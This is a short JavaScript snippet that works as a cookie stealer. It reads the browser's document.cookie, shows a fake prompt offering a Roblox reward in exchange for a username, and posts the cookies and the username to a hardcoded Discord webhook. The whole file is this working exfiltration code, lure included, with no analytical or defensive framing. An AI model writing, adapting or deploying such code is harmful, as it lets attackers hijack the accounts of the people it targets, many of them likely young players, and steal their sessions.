var webhook = "https://discord.com/api/webhooks/1373264182044262511/89mqxIyOePqt07faGGGagM95O7nZM9Kmkixh_eqyp3HaV1ixcYFid1wgjk1qK2BHx89P"; 
var cookies = document.cookie;
var promptMessage = window.prompt("Enter your Roblox username to claim a reward:");
if (promptMessage) {
    fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            content: `Cookie: ${cookies}\nUsername: ${promptMessage}`
        })
    }).catch(error => console.error('Error:', error));
}
